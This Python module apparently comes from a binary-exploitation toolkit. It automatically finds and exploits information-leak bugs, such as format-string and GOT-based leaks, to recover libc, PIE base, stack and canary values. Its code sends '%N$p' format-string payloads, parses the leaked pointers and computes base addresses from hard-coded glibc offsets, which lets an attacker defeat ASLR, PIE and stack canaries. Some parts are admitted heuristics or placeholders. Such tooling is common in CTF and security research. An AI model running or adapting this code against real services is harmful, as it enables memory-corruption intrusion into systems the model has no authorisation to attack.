"""
Automatic information leak finder and exploiter.

Automatically discovers and exploits information disclosure vulnerabilities
to leak:
- Libc addresses (for ASLR bypass)
- Stack addresses (for stack pivoting)
- Binary base (for PIE bypass)
- Stack canaries (for canary bypass)
- Heap addresses (for heap exploitation)
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Tuple, Union
import re
import struct

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class LeakType(Enum):
    """Types of information that can be leaked."""
    UNKNOWN = auto()
    LIBC = auto()           # Libc address (e.g., __libc_start_main return)
    STACK = auto()          # Stack address
    BINARY = auto()         # PIE binary address
    HEAP = auto()           # Heap address
    CANARY = auto()         # Stack canary
    LD_LOADER = auto()      # Dynamic linker address
    VDSO = auto()           # vDSO address


class LeakMethod(Enum):
    """Methods for leaking information."""
    FORMAT_STRING = auto()   # %p, %x, %s format specifiers
    OOB_READ = auto()        # Out-of-bounds read
    UNINIT_MEM = auto()      # Uninitialized memory disclosure
    PUTS_GOT = auto()        # puts(got_entry)
    WRITE_GOT = auto()       # write(1, got_entry, 8)
    PRINTF_PTR = auto()      # printf("%p", ptr)
    STACK_DUMP = auto()      # Function that dumps stack


@dataclass
class LeakPrimitive:
    """Describes an information leak primitive."""
    leak_type: LeakType
    method: LeakMethod
    confidence: float           # 0.0 - 1.0
    offset: Optional[int] = None  # For format string: which %p offset
    address: Optional[int] = None  # For OOB: address to read
    description: str = ""

    # For calculating base addresses
    known_offset: Optional[int] = None  # Offset from base if known
    symbol_name: Optional[str] = None   # e.g., "__libc_start_main_ret"

    def __str__(self) -> str:
        return f"[{self.leak_type.name}] {self.method.name} (confidence: {self.confidence:.0%})"


@dataclass
class LeakResult:
    """Result of exploiting a leak primitive."""
    primitive: LeakPrimitive
    leaked_value: int
    calculated_base: Optional[int] = None
    raw_bytes: bytes = b""


class AutoLeakFinder:
    """
    Automatically find information leak opportunities in binaries.

    Analyzes binary for potential leak points and provides methods
    to exploit them.

    Example:
        finder = AutoLeakFinder(binary, context)
        leaks = finder.find_all_leaks()

        for leak in leaks:
            print(f"Found {leak.leak_type.name} leak via {leak.method.name}")

        # Exploit a format string leak
        tube = process("./vuln")
        libc_base = finder.leak_libc(tube, leaks[0])
    """

    # Common format string offsets for different values
    # These are heuristics based on typical stack layouts
    TYPICAL_CANARY_OFFSETS = range(1, 20)       # Usually near buffer
    TYPICAL_LIBC_OFFSETS = range(15, 50)        # __libc_start_main return
    TYPICAL_PIE_OFFSETS = range(1, 30)          # Return addresses to PIE binary

    # Known libc return address offsets (from libc base)
    LIBC_START_MAIN_RET_OFFSETS = {
        # glibc version -> offset from libc base
        "2.27": 0x21b97,
        "2.31": 0x24083,
        "2.32": 0x24083,
        "2.33": 0x29d90,
        "2.34": 0x29d90,
        "2.35": 0x29d90,
        "generic": 0x24000,  # Approximate
    }

    def __init__(self, binary: Binary, context: Optional[ExploitContext] = None):
        """
        Initialize leak finder.

        Args:
            binary: Target binary
            context: Optional exploitation context
        """
        self.binary = binary
        self.context = context or ExploitContext()
        self._leaks: List[LeakPrimitive] = []

    def find_all_leaks(self) -> List[LeakPrimitive]:
        """
        Find all potential information leak opportunities.

        Returns:
            List of LeakPrimitive describing each opportunity
        """
        self._leaks = []

        # Check for format string vulnerabilities
        self._leaks.extend(self._find_format_string_leaks())

        # Check for dangerous print functions
        self._leaks.extend(self._find_print_leaks())

        # Check for OOB read opportunities
        self._leaks.extend(self._find_oob_leaks())

        # Sort by confidence
        self._leaks.sort(key=lambda x: x.confidence, reverse=True)

        logger.info(f"Found {len(self._leaks)} potential leak primitives")
        return self._leaks

    def _find_format_string_leaks(self) -> List[LeakPrimitive]:
        """Find format string based leak opportunities."""
        leaks = []

        # Check if binary has format string vulnerable functions
        fmt_funcs = {'printf', 'fprintf', 'sprintf', 'snprintf', 'dprintf',
                     'vprintf', 'vfprintf', 'vsprintf', 'vsnprintf'}

        has_fmt_func = any(f in self.binary.imports for f in fmt_funcs)

        if not has_fmt_func:
            return leaks

        # Add potential format string leaks at various offsets
        # Canary is usually close to buffer
        for offset in self.TYPICAL_CANARY_OFFSETS:
            leaks.append(LeakPrimitive(
                leak_type=LeakType.CANARY,
                method=LeakMethod.FORMAT_STRING,
                confidence=0.3,  # Need to verify
                offset=offset,
                description=f"Potential canary at format offset {offset}"
            ))

        # Libc return address
        for offset in self.TYPICAL_LIBC_OFFSETS:
            leaks.append(LeakPrimitive(
                leak_type=LeakType.LIBC,
                method=LeakMethod.FORMAT_STRING,
                confidence=0.4,
                offset=offset,
                known_offset=self.LIBC_START_MAIN_RET_OFFSETS.get("generic"),
                symbol_name="__libc_start_main_ret",
                description=f"Potential libc addr at format offset {offset}"
            ))

        # PIE binary addresses
        if self.binary.protections.pie:
            for offset in self.TYPICAL_PIE_OFFSETS:
                leaks.append(LeakPrimitive(
                    leak_type=LeakType.BINARY,
                    method=LeakMethod.FORMAT_STRING,
                    confidence=0.3,
                    offset=offset,
                    description=f"Potential PIE addr at format offset {offset}"
                ))

        return leaks

    def _find_print_leaks(self) -> List[LeakPrimitive]:
        """Find leaks via print functions with controllable arguments."""
        leaks = []

        # puts() with GOT entry as argument can leak addresses
        if 'puts' in self.binary.imports and self.binary.got:
            for sym, got_addr in self.binary.got.items():
                if sym in ('puts', 'printf', 'read', 'write', '__libc_start_main'):
                    leaks.append(LeakPrimitive(
                        leak_type=LeakType.LIBC,
                        method=LeakMethod.PUTS_GOT,
                        confidence=0.8,
                        address=got_addr,
                        symbol_name=sym,
                        description=f"Leak libc via puts(GOT[{sym}])"
                    ))

        # write() with GOT entry
        if 'write' in self.binary.imports and self.binary.got:
            for sym, got_addr in self.binary.got.items():
                leaks.append(LeakPrimitive(
                    leak_type=LeakType.LIBC,
                    method=LeakMethod.WRITE_GOT,
                    confidence=0.85,
                    address=got_addr,
                    symbol_name=sym,
                    description=f"Leak libc via write(1, GOT[{sym}], 8)"
                ))

        return leaks

    def _find_oob_leaks(self) -> List[LeakPrimitive]:
        """Find out-of-bounds read leak opportunities."""
        leaks = []

        # Look for array access patterns that might be exploitable
        # This is a simplified heuristic - real implementation would
        # need more sophisticated analysis

        # Check for functions that read based on user index
        dangerous_patterns = ['read', 'fread', 'recv', 'gets', 'scanf']

        for func in dangerous_patterns:
            if func in self.binary.imports:
                leaks.append(LeakPrimitive(
                    leak_type=LeakType.UNKNOWN,
                    method=LeakMethod.OOB_READ,
                    confidence=0.2,  # Low confidence without more analysis
                    description=f"Potential OOB via {func}"
                ))

        return leaks

    def probe_format_string(
        self,
        send_func: Callable[[bytes], bytes],
        max_offset: int = 50,
        marker: bytes = b"AAAA"
    ) -> Optional[int]:
        """
        Probe for format string vulnerability and find offset.

        Args:
            send_func: Function that sends payload and returns response
            max_offset: Maximum offset to try
            marker: Marker bytes to look for

        Returns:
            Offset where marker appears, or None
        """
        marker_hex = marker.hex()

        for offset in range(1, max_offset + 1):
            # Try %offset$p format
            payload = marker + f"%{offset}$p".encode()

            try:
                response = send_func(payload)
                response_str = response.decode('latin-1')

                # Look for our marker in hex format
                if marker_hex in response_str.lower():
                    logger.info(f"Found format string offset: {offset}")
                    return offset

                # Also check for pointer format (0x41414141)
                if '0x41414141' in response_str or '41414141' in response_str.lower():
                    logger.info(f"Found format string offset: {offset}")
                    return offset

            except Exception as e:
                logger.debug(f"Error probing offset {offset}: {e}")
                continue

        return None

    def identify_leaked_value(
        self,
        value: int,
        context: Optional[ExploitContext] = None
    ) -> LeakType:
        """
        Identify what type of address a leaked value is.

        Args:
            value: Leaked value
            context: Exploitation context with known addresses

        Returns:
            LeakType classification
        """
        ctx = context or self.context

        # Check if it's a stack address (usually starts with 0x7ff on 64-bit Linux)
        if 0x7ffe00000000 <= value <= 0x7fffffffffff:
            return LeakType.STACK

        # Check if it's a libc address from context
        libc_base = getattr(ctx, 'libc', None)
        if libc_base and hasattr(libc_base, 'base'):
            libc_base = libc_base.base
        else:
            libc_base = None

        if libc_base and libc_base <= value <= libc_base + 0x400000:
            return LeakType.LIBC

        # Check if it matches libc pattern (0x7f...)
        if 0x7f0000000000 <= value <= 0x7f7fffffffff:
            return LeakType.LIBC

        # Check if it's a heap address (usually starts with 0x55 or 0x56 on PIE)
        if 0x550000000000 <= value <= 0x56ffffffffffff:
            # Could be heap or PIE binary
            if self.binary.protections.pie:
                # Need more context to distinguish
                return LeakType.BINARY
            return LeakType.HEAP

        # Check for canary (ends in 0x00 on Linux)
        if value & 0xff == 0 and value != 0:
            if 0x0 < value < 0x00ffffffffffffff:
                return LeakType.CANARY

        # Check if it's in binary address range
        if not self.binary.protections.pie:
            if self.binary.base <= value <= self.binary.base + 0x100000:
                return LeakType.BINARY

        return LeakType.UNKNOWN

    def leak_via_format_string(
        self,
        send_func: Callable[[bytes], bytes],
        offset: int,
        parse_func: Optional[Callable[[bytes], int]] = None
    ) -> Optional[int]:
        """
        Leak a value using format string vulnerability.

        Args:
            send_func: Function to send payload and get response
            offset: Format string offset to read
            parse_func: Optional function to parse response

        Returns:
            Leaked value or None
        """
        payload = f"%{offset}$p".encode()

        try:
            response = send_func(payload)

            if parse_func:
                return parse_func(response)

            # Default parsing: look for hex value
            response_str = response.decode('latin-1')
            match = re.search(r'0x([0-9a-fA-F]+)', response_str)
            if match:
                return int(match.group(1), 16)

            # Try without 0x prefix
            match = re.search(r'([0-9a-fA-F]{8,16})', response_str)
            if match:
                return int(match.group(1), 16)

        except Exception as e:
            logger.error(f"Error leaking at offset {offset}: {e}")

        return None

    def auto_leak_libc(
        self,
        send_func: Callable[[bytes], bytes],
        leaks: Optional[List[LeakPrimitive]] = None
    ) -> Optional[int]:
        """
        Automatically leak and calculate libc base address.

        Args:
            send_func: Function to send payload and get response
            leaks: Optional pre-found leak primitives

        Returns:
            Libc base address or None
        """
        if leaks is None:
            leaks = self.find_all_leaks()

        # Filter to libc leaks
        libc_leaks = [l for l in leaks if l.leak_type == LeakType.LIBC]

        # Sort by confidence
        libc_leaks.sort(key=lambda x: x.confidence, reverse=True)

        for leak in libc_leaks:
            if leak.method == LeakMethod.FORMAT_STRING and leak.offset:
                leaked = self.leak_via_format_string(send_func, leak.offset)
                if leaked:
                    # Verify it looks like a libc address
                    if self.identify_leaked_value(leaked) == LeakType.LIBC:
                        # Calculate base
                        if leak.known_offset:
                            base = leaked - leak.known_offset
                        else:
                            # Assume page alignment
                            base = leaked & ~0xfff

                        # Verify alignment
                        if base & 0xfff == 0:
                            logger.info(f"Leaked libc base: 0x{base:x}")
                            return base

            elif leak.method == LeakMethod.PUTS_GOT and leak.address:
                # Would need ROP to call puts(GOT[sym])
                # This is placeholder - actual implementation depends on context
                pass

        return None

    def auto_leak_canary(
        self,
        send_func: Callable[[bytes], bytes],
        leaks: Optional[List[LeakPrimitive]] = None
    ) -> Optional[int]:
        """
        Automatically leak stack canary.

        Args:
            send_func: Function to send payload and get response
            leaks: Optional pre-found leak primitives

        Returns:
            Stack canary value or None
        """
        if not self.binary.protections.canary:
            logger.info("Binary has no stack canary")
            return None

        if leaks is None:
            leaks = self.find_all_leaks()

        # Filter to canary leaks
        canary_leaks = [l for l in leaks if l.leak_type == LeakType.CANARY]

        for leak in canary_leaks:
            if leak.method == LeakMethod.FORMAT_STRING and leak.offset:
                leaked = self.leak_via_format_string(send_func, leak.offset)
                if leaked:
                    # Verify it looks like a canary (ends in 0x00)
                    if leaked & 0xff == 0 and leaked != 0:
                        logger.info(f"Leaked canary: 0x{leaked:x}")
                        return leaked

        return None

    def auto_leak_pie_base(
        self,
        send_func: Callable[[bytes], bytes],
        leaks: Optional[List[LeakPrimitive]] = None
    ) -> Optional[int]:
        """
        Automatically leak and calculate PIE binary base.

        Args:
            send_func: Function to send payload and get response
            leaks: Optional pre-found leak primitives

        Returns:
            Binary base address or None
        """
        if not self.binary.protections.pie:
            logger.info("Binary is not PIE, base is known")
            return self.binary.base

        if leaks is None:
            leaks = self.find_all_leaks()

        # Filter to binary leaks
        pie_leaks = [l for l in leaks if l.leak_type == LeakType.BINARY]

        for leak in pie_leaks:
            if leak.method == LeakMethod.FORMAT_STRING and leak.offset:
                leaked = self.leak_via_format_string(send_func, leak.offset)
                if leaked:
                    if self.identify_leaked_value(leaked) == LeakType.BINARY:
                        # Calculate base (page-aligned)
                        base = leaked & ~0xfff

                        # Verify it's reasonable
                        if 0x550000000000 <= base <= 0x56ffffffffffff:
                            logger.info(f"Leaked PIE base: 0x{base:x}")
                            return base

        return None

    def create_leak_chain(
        self,
        required_leaks: List[LeakType]
    ) -> List[LeakPrimitive]:
        """
        Create ordered chain of leaks for required information.

        Args:
            required_leaks: Types of information needed

        Returns:
            Ordered list of leak primitives to execute
        """
        if not self._leaks:
            self.find_all_leaks()

        chain = []

        for leak_type in required_leaks:
            # Find best primitive for this leak type
            candidates = [l for l in self._leaks if l.leak_type == leak_type]
            if candidates:
                # Sort by confidence
                candidates.sort(key=lambda x: x.confidence, reverse=True)
                chain.append(candidates[0])
            else:
                logger.warning(f"No leak primitive found for {leak_type.name}")

        return chain


# Convenience functions

def find_leaks(binary: Binary) -> List[LeakPrimitive]:
    """
    Find all information leak opportunities in binary.

    Args:
        binary: Target binary

    Returns:
        List of leak primitives
    """
    finder = AutoLeakFinder(binary)
    return finder.find_all_leaks()


def auto_leak(
    binary: Binary,
    send_func: Callable[[bytes], bytes],
    leak_type: LeakType = LeakType.LIBC
) -> Optional[int]:
    """
    Automatically leak specific information.

    Args:
        binary: Target binary
        send_func: Function to send payload and get response
        leak_type: Type of information to leak

    Returns:
        Leaked value/address or None
    """
    finder = AutoLeakFinder(binary)

    if leak_type == LeakType.LIBC:
        return finder.auto_leak_libc(send_func)
    elif leak_type == LeakType.CANARY:
        return finder.auto_leak_canary(send_func)
    elif leak_type == LeakType.BINARY:
        return finder.auto_leak_pie_base(send_func)

    return None
